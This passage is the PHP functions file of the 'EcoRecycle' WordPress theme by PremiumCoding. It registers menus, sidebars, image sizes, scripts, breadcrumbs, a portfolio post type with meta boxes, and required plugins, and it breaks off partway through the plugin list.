<?php
add_action( 'after_setup_theme', 'pmc_ecorecycle_theme_setup' );
function pmc_ecorecycle_theme_setup() {
	include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
	global $pmc_data;
	/*text domain*/
	load_theme_textdomain( 'ecorecycle', get_template_directory() . '/lang' );
	/*post formats support*/
	add_theme_support( 'post-formats', array( 'link', 'gallery', 'video' , 'audio') );
	/*feed support*/
	add_theme_support( 'automatic-feed-links' );
	/*post thumb support*/
	add_theme_support( 'post-thumbnails' ); // this enable thumbnails and stuffs
	/*setting thumb size*/
		/*title*/
	add_theme_support( 'title-tag' );
	
	add_image_size( 'gallery', 95,95, true );
	add_image_size( 'port2',230,150, true );
	add_image_size( 'advertise', 235,130, true );
	add_image_size( 'homeProduct', 280 ,180, true );
	add_image_size( 'homePort', 393 ,300, true );
	add_image_size( 'homePortBig', 393 ,600, true );	
	add_image_size( 'shop', 280 ,180, true );
	add_image_size( 'widget', 90,60, true );
	add_image_size( 'postBlock', 370,260, true );
	add_image_size( 'blog', 800, 490, true );
	add_image_size( 'port2', 570,450, true );
	add_image_size( 'port3', 380,300, true );
	add_image_size( 'port4', 280,220, true );
	add_image_size( 'related', 180,110, true );
	add_image_size( 'homepost', 1180,490, true );
	add_image_size( 'blogMini', 400, 245, true );
	
	add_filter( 'postmeta_form_limit' , 'customfield_limit_increase' );
	function customfield_limit_increase( $limit ) {
	return 200;	
	}
	
	if(isset($pmc_data['menu'])){
	$menus = $pmc_data['menu'];
	$menuOut = '';
	$i = 0;
	foreach($menus as $menu){
		$title = $menu['title'];
		
		$id = preg_replace('/[^a-zA-Z0-9_ %\[\]\.\(\)%&-]/s', '', $menu['title']);
		$id = strtolower(str_replace(' ', '' , $id));
		$menu_out[$id] = $menu['title'];
		$i++;
	}
	/*register custom menus*/
	register_nav_menus($menu_out);
	
	}
	register_nav_menus(array(
	
			'pmcmainmenu' => 'Main Menu',
			'pmcsinglemenu' => 'Single page menu',
			'pmcrespmenu' => 'Responsive Menu',	
			'pmcrespsinglemenu' => 'Responsive Single page menu',
			'pmcscrollmenu' => 'Scroll Menu'			
	));	
	
	if(isset($pmc_data['sidebar'])){
	$sidebars = $pmc_data['sidebar'];
	$sidebarOut = '';
		foreach($sidebars as $sidebar){
			$title = $sidebar['title'];
			$id = preg_replace('/[^a-zA-Z0-9_ %\[\]\.\(\)%&-]/s', '', $sidebar['title']);
			$id = strtolower(str_replace(' ', '' , $id));
			$menu_out[$id] = $menu['title'];
			register_sidebar(array(
				'id' => $id,
				'name' => $title ,
				'before_widget' => '<div class="widget %2$s">',
				'after_widget' => '</div>',
				'before_title' => '<h3>',
				'after_title' => '</h3><div class="widget-line"></div>'
			));			
		}
	}
		
    register_sidebar(array(
        'id' => 'sidebar',
        'name' => 'Sidebar main',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3><div class="widget-line"></div>'
    ));		    		
	
    register_sidebar(array(
        'id' => 'homepost',
        'name' => 'Home post sidebar',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3><div class="widget-line"></div>'
    ));		 
    register_sidebar(array(
        'id' => 'contact',
        'name' => 'Contact sidebar',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
    
    register_sidebar(array(
        'id' => 'footer1',
        'name' => 'Footer sidebar 1',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
    
    register_sidebar(array(
        'id' => 'footer2',
        'name' => 'Footer sidebar 2',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
	
    
    register_sidebar(array(
        'id' => 'footer3',
        'name' => 'Footer sidebar 3',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
    
    register_sidebar(array(
        'id' => 'footer4',
        'name' => 'Footer sidebar 4',
        'before_widget' => '<div class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));


	
	// Responsive walker menu
	class pmc_Walker_Responsive_Menu extends Walker_Nav_Menu {
		
		function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
			global $wp_query;		
			$item_output = $attributes = $prepend ='';
			$class_names = $value = '';
			$classes = empty( $item->classes ) ? array() : (array) $item->classes;
			$class_names = join( ' ', apply_filters( '', array_filter( $classes ), $item ) );			
			$class_names = ' class="'. esc_attr( $class_names ) . '"';			   
			// Create a visual indent in the list if we have a child item.
			$visual_indent = ( $depth ) ? str_repeat('&nbsp;&nbsp;&nbsp;&nbsp;<i class="fa fa-circle"></i>', $depth) : '';
			// Load the item URL
			$attributes .= ! empty( $item->url ) ? ' href="'   . esc_attr( $item->url ) .'"' : '';
			// If we have hierarchy for the item, add the indent, if not, leave it out.
			// Loop through and output each menu item as this.
			if($depth != 0) {
				$item_output .= '<a '. $class_names . $attributes .'>&nbsp;&nbsp;&nbsp;&nbsp;<i class="fa fa-circle"></i>' . $item->title. '</a><br>';
			} else {
				$item_output .= '<a ' . $class_names . $attributes .'><strong>'.$prepend.$item->title.'</strong></a><br>';
			}
			// Make the output happen.
			$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}
	}
	
	
	// Main walker menu	
	class pmc_Walker_Main_Menu extends Walker_Nav_Menu
	{
		  function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
			   global $wp_query;
			   $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
			   $class_names = $value = '';
			   $classes = empty( $item->classes ) ? array() : (array) $item->classes;
			   $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
			   $class_names = ' class="'. esc_attr( $class_names ) . '"';
			   $output .= $indent . '<li id="menu-item-'.rand(0,9999).'-'. $item->ID . '"' . $value . $class_names .'>';
			   $attributes_title  = ! empty( $item->attr_title ) ? ' <i class="fa '  . esc_attr( $item->attr_title ) .'"></i>' : '';
			   $attributes  = ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
			   $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
			   $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
			   $prepend = '';
			   $append = '';
			   if($depth != 0)
			   {
					$append = $prepend = "";
			   }
				$item_output = $args->before;
				$item_output .= '<a '. $attributes .'>';
				$item_output .= $attributes_title.$args->link_before .$prepend.apply_filters( 'the_title', $item->title, $item->ID ).$append;
				$item_output .= $args->link_after;
				$item_output .= '</a>';	
				$item_output .= $args->after;
				$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}
	}
	



}




/*-----------------------------------------------------------------------------------*/
// Options Framework
/*-----------------------------------------------------------------------------------*/
// Paths to admin functions
define('MY_TEXTDOMAIN', 'ecorecycle');
define('ADMIN_PATH', get_stylesheet_directory() . '/admin/');
define('BOX_PATH', get_stylesheet_directory() . '/includes/boxes/');
define('ADMIN_DIR', get_template_directory_uri() . '/admin/');
define('LAYOUT_PATH', ADMIN_PATH . '/layouts/');
// You can mess with these 2 if you wish.
$themedata = wp_get_theme(get_stylesheet_directory() . '/style.css');
define('THEMENAME', $themedata['Name']);
define('OPTIONS', 'of_options_pmc'); // Name of the database row where your options are stored
require_once (get_template_directory() . '/includes/import/plugins/options-importer.php');   // Options panel settings and custom settings
if (is_admin() && isset($_GET['activated'] ) && $pagenow == "themes.php" ) {
	//Call action that sets
	if(!get_option('of_options_pmc')){
		import(get_template_directory() . '/includes/import/options.json');
	}

}

// Build Options
$root =  get_template_directory() .'/';
$admin =  get_template_directory() . '/admin/';
require_once ($admin . 'theme-options.php');   // Options panel settings and custom settings
require_once ($admin . 'admin-interface.php');  // Admin Interfaces
$includes =  get_template_directory() . '/includes/';
$widget_includes =  get_template_directory() . '/includes/widgets/';
/* include custom widgets */
require_once ($widget_includes . 'recent_post_widget.php'); 
require_once ($widget_includes . 'popular_post_widget.php');
/* include scripts */
function pmc_scripts() {
	global $pmc_data;
	/*scripts*/
	wp_enqueue_script('pmc_fitvideos', get_template_directory_uri() . '/js/jquery.fitvids.js', array('jquery'),true,true);	
	wp_enqueue_script('pmc_scrollto', get_template_directory_uri() . '/js/jquery.scrollTo.js', array('jquery'),true,true);	
	wp_enqueue_script('pmc_retinaimages', get_template_directory_uri() . '/js/retina.min.js', array('jquery'),true,true);	
	wp_enqueue_script('pmc_parallax', get_template_directory_uri() . '/js/jquery.parallax.js', array('jquery'),true,true);
	wp_enqueue_script('pmc_customjs', get_template_directory_uri() . '/js/custom.js', array('jquery'),true,true);  	      
	wp_enqueue_script('pmc_prettyphoto_n', get_template_directory_uri() . '/js/jquery.prettyPhoto.js', array('jquery'),true,true);
	wp_enqueue_script('pmc_easing', get_template_directory_uri() . '/js/jquery.easing.1.3.js', array('jquery'),true,true);
	wp_enqueue_script('pmc_cycle', get_template_directory_uri() . '/js/jquery.cycle.all.min.js', array('jquery'),true,true);
	wp_enqueue_script('pmc_any', get_template_directory_uri() . '/js/jquery.anythingslider.js', array('jquery'),true,true);
	wp_register_script('pmc_isotope', get_template_directory_uri() . '/js/jquery.isotope.min.js', array('jquery'),true,true);  		
	wp_register_script('pmc_news', get_template_directory_uri() . '/js/jquery.li-scroller.1.0.js', array('jquery'),true,true);  
	wp_enqueue_script('pmc_gistfile', get_template_directory_uri() . '/js/gistfile_pmc.js', array('jquery') ,true,true);  
	wp_register_script('pmc_bxSlider', get_template_directory_uri() . '/js/jquery.bxslider.js', array('jquery') ,true,true);  
	wp_enqueue_script('addthis', 'https://s7.addthis.com/js/300/addthis_widget.js', array('jquery') ,true,false); 	
	/*style*/
	wp_enqueue_style( 'prettyp', get_template_directory_uri() . '/css/prettyPhoto.css', 'style');
	if(isset($pmc_data['body_font'])){			
		if(($pmc_data['body_font']['face'] != 'verdana') and ($pmc_data['body_font']['face'] != 'trebuchet') and 
			($pmc_data['body_font']['face'] != 'georgia') and ($pmc_data['body_font']['face'] != 'Helvetica Neue') and 
			($pmc_data['body_font']['face'] != 'times,tahoma') and ($pmc_data['body_font']['face'] != 'arial')) {	
				if(isset($pmc_data['google_body_custom']) && $pmc_data['google_body_custom'] != ''){
					$font_explode = explode(' ' , $pmc_data['google_body_custom']);
					$font_body  = '';
					$size = count($font_explode);
					$count = 0;
					if(count($font_explode) > 0){
						foreach($font_explode as $font){
							if($count < $size-1){
								$font_body .= $font_explode[$count].'+';
							}
							else{
								$font_body .= $font_explode[$count];
							}
							$count++;
						}
					}else{
						$font_body = $pmc_data['google_body_custom'];
					}
				}else{
					$font_body = $pmc_data['body_font']['face'];
				}			
				wp_enqueue_style('googleFontbody', 'https://fonts.googleapis.com/css?family='.$font_body ,'',NULL);			
		}						
	}		
	if(isset($pmc_data['heading_font'])){			
		if(($pmc_data['heading_font']['face'] != 'verdana') and ($pmc_data['heading_font']['face'] != 'trebuchet') and 
			($pmc_data['heading_font']['face'] != 'georgia') and ($pmc_data['heading_font']['face'] != 'Helvetica Neue') and 
			($pmc_data['heading_font']['face'] != 'times,tahoma') and ($pmc_data['heading_font']['face'] != 'arial')) {	
				if(isset($pmc_data['google_heading_custom']) && $pmc_data['google_heading_custom'] != ''){
					$font_explode = explode(' ' , $pmc_data['google_heading_custom']);
					$font_heading  = '';
					$size = count($font_explode);
					$count = 0;
					if(count($font_explode) > 0){
						foreach($font_explode as $font){
							if($count < $size-1){
								$font_heading .= $font_explode[$count].'+';
							}
							else{
								$font_heading .= $font_explode[$count];
							}
							$count++;
						}
					}else{
						$font_heading = $pmc_data['google_heading_custom'];
					}
				}else{
					$font_heading = $pmc_data['heading_font']['face'];
				}
				wp_enqueue_style('googleFontHeading', 'https://fonts.googleapis.com/css?family='.$font_heading ,'',NULL);			
		}						
	}
	if(isset($pmc_data['menu_font']['face'])){			
		if(($pmc_data['menu_font']['face'] != 'verdana') and ($pmc_data['menu_font']['face'] != 'trebuchet') and 
			($pmc_data['menu_font']['face']!= 'georgia') and ($pmc_data['menu_font']['face'] != 'Helvetica Neue') and 
			($pmc_data['menu_font']['face'] != 'times,tahoma') and ($pmc_data['menu_font']['face'] != 'arial')) {	
				if(isset($pmc_data['google_menu_custom']) && $pmc_data['google_menu_custom'] != ''){
					$font_explode = explode(' ' , $pmc_data['google_menu_custom']);
					$font_menu  = '';
					$size = count($font_explode);
					$count = 0;
					if(count($font_explode) > 0){
						foreach($font_explode as $font){
							if($count < $size-1){
								$font_menu .= $font_explode[$count].'+';
							}
							else{
								$font_menu .= $font_explode[$count];
							}
							$count++;
						}
					}else{
						$font_menu = $pmc_data['google_menu_custom'];
					}
				}else{
					$font_menu = $pmc_data['menu_font']['face'];
				}				
				wp_enqueue_style('googleFontMenu', 'https://fonts.googleapis.com/css?family='.$font_menu ,'',NULL);			
		}						
	}	
	wp_enqueue_script('font-awesome_pms', 'https://use.fontawesome.com/30ede005b9.js' , '',null);	
	wp_enqueue_style('animated-css',  get_stylesheet_directory_uri() . '/css/animate.min.css', 'style');			
}
add_action( 'wp_enqueue_scripts', 'pmc_scripts' );

require_once ($admin . 'admin-functions.php');  // Theme actions based on options settings
 
// Other theme options
require_once ($includes . 'class-tgm-plugin-activation.php');


/*shorcode to excerpt*/
remove_filter( 'get_the_excerpt', 'wp_trim_excerpt'  ); //Remove the filter we don't want
add_filter( 'get_the_excerpt', 'pmc_wp_trim_excerpt' ); //Add the modified filter
add_filter( 'the_excerpt', 'do_shortcode' ); //Make sure shortcodes get processed

function pmc_wp_trim_excerpt($text = '') {
	$raw_excerpt = $text;
	if ( '' == $text ) {
		$text = get_the_content('');
		//$text = strip_shortcodes( $text ); //Comment out the part we don't want
		$text = apply_filters('the_content', $text);
		$text = str_replace(']]>', ']]&gt;', $text);
		$excerpt_length = apply_filters('excerpt_length', 55);
		$excerpt_more = apply_filters('excerpt_more', ' ' . '[...]');
		$text = wp_trim_words( $text, $excerpt_length, $excerpt_more );
	}
	return apply_filters('wp_trim_excerpt', $text, $raw_excerpt);
}

/*change menu tlabels*/
add_filter( 'gettext', 'pmc_change_label_names');
	
function pmc_change_label_names($translated_text){
	if (is_admin()){
		switch ( $translated_text ) {
			case 'Title Attribute' :
				$translated_text = __( '<a href="https://fontawesome.io/icons/">Font Awesome</a> icon. Icon will be shown before link.', 'ecorecycle' );
				break;
		}
	}
	return $translated_text;
}

/* custom breadcrumb */
function pmc_breadcrumb($title = false) {
	global $pmc_data;
	$breadcrumb = '';
	if (!is_home()) {
		if($title == false){
			$breadcrumb .= '<a href="';
			$breadcrumb .=  home_url();
			$breadcrumb .=  '">';
			$breadcrumb .= __('Home', 'ecorecycle');
			$breadcrumb .=  "</a> &#187; ";
		}
		if (is_single()) {
			if (is_single()) {
				$name = '';
				if(!get_query_var($pmc_data['port_slug']) && !get_query_var('product')){
					$category = get_the_category(); +
					$category_id = get_cat_ID($category[0]->cat_name);
					$category_link = get_category_link($category_id);					
					$name = '<a href="'. esc_url( $category_link ).'">'.$category[0]->cat_name .'</a>';
				}
				else{
					$taxonomy = 'portfoliocategory';
					$entrycategory = get_the_term_list( get_the_ID(), $taxonomy, '', ',', '' );
					$catstring = $entrycategory;
					$catidlist = explode(",", $catstring);	
					$name = $catidlist[0];
				}
				if($title == false){
					$breadcrumb .= $name .' &#187; <span>'. get_the_title().'</span>';
				}
				else{
					$breadcrumb .= get_the_title();
				}
			}	
		} elseif (is_page()) {
			$breadcrumb .=  '<span>'.get_the_title().'</span>';
		}
		elseif(get_query_var('portfoliocategory')){
			$term = get_term_by('slug', get_query_var('portfoliocategory'), 'portfoliocategory'); $name = $term->name; 
			$breadcrumb .=  '<span>'.$name.'</span>';
		}	
		else if(is_tag()){
			$tag = get_query_var('tag');
			$tag = str_replace('-',' ',$tag);
			$breadcrumb .=  '<span>'.$tag.'</span>';
		}
		else if(is_search()){
			$breadcrumb .= __('Search results for ', 'ecorecycle') .'"<span>'.get_search_query().'</span>"';			
		} 
		else if(is_category()){
			$cat = get_query_var('cat');
			$cat = get_category($cat);
			$breadcrumb .=  '<span>'.$cat->name.'</span>';
		}
		else if(is_archive()){
			$breadcrumb .=  '<span>'.__('Archive','ecorecycle').'</span>';
		}	
		else{
			$breadcrumb .=  'Home';
		}
	}
	return $breadcrumb ;
}
/* social share links */
function pmc_socialLinkSingle() {
	$social = '';
	$social ='<div class="addthis_toolbox"><div class="custom_images">';
	$social .= '<a class="addthis_button_facebook" ><i class="fa fa-facebook"></i></a>';            
	$social .= '<a class="addthis_button_twitter" ><i class="fa fa-twitter"></i></a>';  
	$social .= '<a class="addthis_button_pinterest_share" ><i class="fa fa-pinterest"></i></a>'; 
	$social .= '<a class="addthis_button_email" ><i class="fa fa-envelope"></i></a>'; 
	$social .='<a class="addthis_button_more"><i class="fa fa-plus"></i></a></div>';	
	$social .= '</div>'; 
	echo pmc_security($social);
}
/* links to social profile */
/* links to social profile */
function pmc_socialLink() {
	$social = '';
	global $pmc_data; 
	$icons = $pmc_data['socialicons'];
	foreach ($icons as $icon){
		$social .= '<a target="_blank"  href="'.$icon['link'].'" title="'.$icon['title'].'"><img src = "'.$icon['url'].'" alt="'.$icon['title'].'"></a>';	
	}
	echo pmc_security($social);
}

add_filter('the_content', 'pmc_addlightbox');

/* add lightbox to images */
function pmc_addlightbox($content)
{	global $post;
	$pattern = "/<a(.*?)href=('|\")(.*?).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>/i";
  	$replacement = '<a$1href=$2$3.$4$5 rel="lightbox[%LIGHTID%]"$6>';
    $content = preg_replace($pattern, $replacement, $content);
	if(isset($post->ID))
		$content = str_replace("%LIGHTID%", $post->ID, $content);
    return $content;
}

/* remove double // char */

function pmc_stripText($string) 
{ 
    return str_replace("\\",'',$string);
} 


/* custom post type portfolio */

add_action( 'init', 'pmc_portfoliocategory' );
function pmc_portfoliocategory() {
	global $pmc_data;
	if (isset($pmc_data['port_slug']) && $pmc_data['port_slug'] != ''){
		$port = $pmc_data['port_slug'];
	}
	else{
		$port = 'portfolio';
	}	
	register_taxonomy(
		'portfoliocategory',
		array($port),
		array(
			'label' => __( 'Portfolio Categories' ,'ecorecycle'),
			'rewrite' => array( 'slug' => 'portfoliocategory' ),
			'hierarchical' => true,
			"rewrite" => true,
			"singular_label" => "Portfolio Category"
		)
	);
}
add_action('init', 'pmc_create_portfolio');

function pmc_create_portfolio() {
	global $pmc_data;
	if (isset($pmc_data['port_slug']) && $pmc_data['port_slug'] != ''){
		$port = $pmc_data['port_slug'];
	}
	else{
		$port = 'portfolio';
	}
	$portfolio_args = array(
		'label' => 'Portfolio',
		'singular_label' => 'Portfolio',
		'public' => true,
		'show_ui' => true,
		'capability_type' => 'post',
		'hierarchical' => false,
		'rewrite' => true,
		'supports' => array('title', 'editor', 'thumbnail', 'author', 'comments', 'excerpt')
	);
	register_post_type($port,$portfolio_args);
}

add_action("admin_init", "pmc_add_portfolio");
add_action('save_post', 'pmc_update_portfolio_data');
function pmc_add_portfolio(){
	global $pmc_data;
	if (isset($pmc_data['port_slug']) && $pmc_data['port_slug'] != ''){
		$port = $pmc_data['port_slug'];
	}
	else{
		$port = 'portfolio';
	}
	add_meta_box("portfolio_details", "Portfolio Entry Options", "pmc_portfolio_options", $port, "normal", "high");
}

function pmc_update_portfolio_data(){
	global $post;
	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
        return $post_id;
    }
	if($post){
		if( isset($_POST["author"]) ) {
			update_post_meta($post->ID, "author", $_POST["author"]);
		}
		if( isset($_POST["date"]) ) {
			update_post_meta($post->ID, "date", $_POST["date"]);
		}
		if( isset($_POST["detail_active"]) ) {
			update_post_meta($post->ID, "detail_active", $_POST["detail_active"]);
		}else{
			update_post_meta($post->ID, "detail_active", 0);
		}
		if( isset($_POST["website_url"]) ) {
			update_post_meta($post->ID, "website_url", $_POST["website_url"]);
		}
		if( isset($_POST["status"]) ) {
			update_post_meta($post->ID, "status", $_POST["status"]);
		}		
		if( isset($_POST["customer"]) ) {
			update_post_meta($post->ID, "customer", $_POST["customer"]);
		}			
		if( isset($_POST["skils"]) ) {
			update_post_meta($post->ID, "skils", $_POST["skils"]);
		}			
		if( isset($_POST["video"]) ) {
			update_post_meta($post->ID, "video", $_POST["video"]);
		}
		if( isset($_POST["show_video"]) ) {
			update_post_meta($post->ID, "show_video", $_POST["show_video"]);
		}else{
			update_post_meta($post->ID, "show_video", 0);
		}
	}
}
function pmc_portfolio_options(){
	global $post;
	$pmc_data = get_post_custom($post->ID);
	if (isset($pmc_data["author"][0])){
		$author = $pmc_data["author"][0];
	}else{
		$author = "";
	}
	if (isset($pmc_data["date"][0])){
		$date = $pmc_data["date"][0];
	}else{
		$date = "";
	}
	if (isset($pmc_data["status"][0])){
		$status = $pmc_data["status"][0];
	}else{
		$status = "";
	}	
	if (isset($pmc_data["detail_active"][0])){
		$detail_active = $pmc_data["detail_active"][0];
	}else{
		$detail_active = 0;
		$pmc_data["detail_active"][0] = 0;
	}
	if (isset($pmc_data["website_url"][0])){
		$website_url = $pmc_data["website_url"][0];
	}else{
		$website_url = "";
	}
	
	if (isset($pmc_data["customer"][0])){
		$customer = $pmc_data["customer"][0];
	}else{
		$customer = "";
	}	 
	if (isset($pmc_data["skils"][0])){
		$skils = $pmc_data["skils"][0];
	}else{
		$skils = "";
	}	 	
	
	if (isset($pmc_data["video"][0])){
		$video = $pmc_data["video"][0];
	}else{
		$video = "";
	}
	if (isset($pmc_data["show_video"][0])){
		$show_video = $pmc_data["show_video"][0];
	}else{
		$show_video = 0;
		$pmc_data["show_video"][0] = 0;
	}	
	
	?>
    <div id="portfolio-options">
        <table cellpadding="15" cellspacing="15">
        	<tr>
                <td colspan="2"><strong>Portfolio Overview Options:</strong></td>
            </tr>
            <tr>
                <td><label>Link to Detail Page: <i style="color: #999999;">(Do you want a project detail page?)</i></label></td><td><input type="checkbox" name="detail_active" value="1" <?php if( isset($detail_active)){ checked( '1', $pmc_data["detail_active"][0] ); } ?> /></td>	
            </tr>
            <tr>
            	<td><label>Project Link: <i style="color: #999999;">(The URL of your project)</i></label></td><td><input name="website_url" style="width:100%" value="<?php echo esc_url($website_url); ?>" /></td>
            </tr>
            <tr>
            	<td><label>Project Author: <i style="color: #999999;">(The URL of your project)</i></label></td><td><input name="author" style="width:100%" value="<?php echo esc_attr($author); ?>" /></td>
            </tr>
            <tr>
            	<td><label>Project date: <i style="color: #999999;">(Date of project)</i></label></td><td><input name="date" style="width:100%" value="<?php echo esc_attr($date); ?>" /></td>
            </tr>	
            <tr>
            	<td><label>Customer: <i style="color: #999999;">(Customer of project)</i></label></td><td><input name="customer" style="width:100%" value="<?php echo esc_attr($customer); ?>" /></td>
            </tr>				
            <tr>
            	<td><label>Project status: <i style="color: #999999;">(Status of project)</i></label></td><td><input name="status" style="width:100%" value="<?php echo esc_attr($status); ?>" /></td>
            </tr>	
            <tr>
            	<td><label>Required skils: <i style="color: #999999;">(each skill into new line)</i></label></td><td><textarea name="skils" style="width:100%; height:300px;" /><?php echo esc_attr($skils); ?></textarea></td>
            </tr>				
        </table>
    </div>
    <div id="portfolio-options-video">
        <table cellpadding="15" cellspacing="15">
        	<tr>
                <td colspan="2"><strong>Portfolio Options for video:</strong></td>
            </tr>
            <tr>
                <td><label>Display video insted of images: <i style="color: #999999;">(Video will replace images!)</i></label></td><td><input type="checkbox" name="show_video" value="1" <?php if( isset($show_video)){ checked( '1', $pmc_data["show_video"][0] ); } ?> /></td>	
            </tr>
            <tr>
            	<td><label>Video URL: <i style="color: #999999;">(The URL of your video)</i></label></td><td><input name="video" style="width:100%" value="<?php echo esc_url($video); ?>" /></td>
            </tr>				
        </table>
    </div>	
<?php
}	
	
/* get category name */
function pmc_getcatname($catID,$posttype){
		if($catID != 0){
		$cat_obj = get_term($catID, $posttype);
		$cat_name = '';
		$cat_name = $cat_obj->name;
		return $cat_name;
		}
	}
	
/* custom post types */	
add_action('save_post', 'pmc_update_post_type');
add_action("admin_init", "pmc_add_meta_box");

function pmc_add_meta_box(){
	add_meta_box("pmc_post_type", "Post type", "pmc_post_type", "post", "normal", "high");		
}	

function pmc_post_type(){
	global $post;
	$pmc_data = get_post_custom(get_the_id());

	if (isset($pmc_data["video_post_url"][0])){
		$video_post_url = $pmc_data["video_post_url"][0];
	}else{
		$video_post_url = "";
	}	
	
	if (isset($pmc_data["link_post_url"][0])){
		$link_post_url = $pmc_data["link_post_url"][0];
	}else{
		$link_post_url = "";
	}	
	
	if (isset($pmc_data["audio_post_url"][0])){
		$audio_post_url = $pmc_data["audio_post_url"][0];
	}else{
		$audio_post_url = "";
	}	
	if (isset($pmc_data["audio_post_title"][0])){
		$audio_post_title = $pmc_data["audio_post_title"][0];
	}else{
		$audio_post_title = "";
	}	
?>
    <div id="portfolio-category-options">
        <table cellpadding="15" cellspacing="15">
            <tr class="videoonly" style="border-bottom:1px solid #000;">
            	<td><label>Video URL(*required) - add if you select video post: <i style="color: #999999;"></i></label><br><input name="video_post_url" value="<?php echo esc_url($video_post_url); ?>" /> </td>	
			</tr>		
            <tr class="linkonly" >
            	<td><label>Link URL - add if you select link post : <i style="color: #999999;"></i></label><br><input name="link_post_url"  value="<?php echo esc_url($link_post_url); ?>" /></td>
            </tr>				
            <tr class="audioonly">
            	<td><label>Audio URL - add if you select audio post: <i style="color: #999999;"></i></label><br><input name="audio_post_url"  value="<?php echo esc_url($audio_post_url); ?>" /></td>
            </tr>
            <tr class="audioonly">
            	<td><label>Audio title - add if you select audio post: <i style="color: #999999;"></i></label><br><input name="audio_post_title"  value="<?php echo esc_url($audio_post_title); ?>" /></td>
            </tr>		
            <tr class="nooptions">
            	<td>No options for this post type.</td>
            </tr>				
        </table>
    </div>
	<style>
	#portfolio-category-options td {width:50%}
	#portfolio-category-options input {width:100%}
	</style>
	<script>
	jQuery(document).ready(function(){	
			if (jQuery("input[name=post_format]:checked").val() == 'video'){
				jQuery('.videoonly').show();
				jQuery('.audioonly, .linkonly , .nooptions').hide();}
				
			else if (jQuery("input[name=post_format]:checked").val() == 'link'){
				jQuery('.linkonly').show();
				jQuery('.videoonly, .select_video,.nooptions').hide();	}	
				
			else if (jQuery("input[name=post_format]:checked").val() == 'audio'){
				jQuery('.videoonly, .linkonly,.nooptions').hide();	
				jQuery('.audioonly').show();}						
			else{
				jQuery('.videoonly').hide();
				jQuery('.audioonly').hide();
				jQuery('.linkonly').hide();
				jQuery('.nooptions').show();}	
			
			jQuery("input[name=post_format]").change(function(){
			if (jQuery("input[name=post_format]:checked").val() == 'video'){
				jQuery('.videoonly').show();
				jQuery('.audioonly, .linkonly,.nooptions').hide();}
				
			else if (jQuery("input[name=post_format]:checked").val() == 'link'){
				jQuery('.linkonly').show();
				jQuery('.videoonly, .audioonly,.nooptions').hide();	}	
				
			else if (jQuery("input[name=post_format]:checked").val() == 'audio'){
				jQuery('.videoonly, .linkonly,.nooptions').hide();	
				jQuery('.audioonly').show();}	
				
			else{
				jQuery('.videoonly').hide();
				jQuery('.audioonly').hide();
				jQuery('.linkonly').hide();
				jQuery('.nooptions').show();}				
		});
	});
	</script>	
      
<?php
	
}
function pmc_update_post_type(){
	global $post;
	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
        return $post_id;
    }
	if($post){

		if( isset($_POST["video_post_url"]) ) {
			update_post_meta($post->ID, "video_post_url", $_POST["video_post_url"]);
		}		
		if( isset($_POST["link_post_url"]) ) {
			update_post_meta($post->ID, "link_post_url", $_POST["link_post_url"]);
		}	
		if( isset($_POST["audio_post_url"]) ) {
			update_post_meta($post->ID, "audio_post_url", $_POST["audio_post_url"]);
		}		
		if( isset($_POST["audio_post_title"]) ) {
			update_post_meta($post->ID, "audio_post_title", $_POST["audio_post_title"]);
		}					
			
	}
	
	
	
}
if( !function_exists( 'ecorecycle_fallback_menu' ) )
{

	function ecorecycle_fallback_menu()
	{
		$current = "";
		if (is_front_page()){$current = "class='current-menu-item'";} 
		echo "<div class='fallback_menu'>";
		echo "<ul class='ecorecycle_fallback menu'>";
		echo "<li $current><a href='".esc_url(home_url('/'))."'>Home</a></li>";
		wp_list_pages('title_li=&sort_column=menu_order');
		echo "</ul></div>";
	}
}

add_filter( 'the_category', 'pmc_add_nofollow_cat' );  

function pmc_add_nofollow_cat( $text ) { 
	$text = str_replace('rel="category tag"', "", $text); 
	return $text; 
}

/* get image from post */
function pmc_getImage($id, $image){
	$return = '';
	if ( has_post_thumbnail() ){
		$return = get_the_post_thumbnail($id,$image);
		}
	else
		$return = '';
	
	return 	$return;
}

if ( ! isset( $content_width ) ) $content_width = 800;
	
function pmc_excerpt_more( $more ) {
	return ' ...';
}
add_filter('excerpt_more', 'pmc_excerpt_more');

/*import plugins*/

add_action( 'tgmpa_register', 'pmc_required_plugins' );

function pmc_required_plugins() {

    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(

        array(
            'name'               => 'Page builder - PremiumCoding', // The plugin name.
            'slug'               => 'page-builder-pmc', // The plugin slug (typically the folder name).
            'source'             => 'page-builder-pmc.zip', // The plugin source.
            'required'           => true, // If false, the plugin is only 'recommended' instead of required.
            'version'            => '1.8', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
            'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
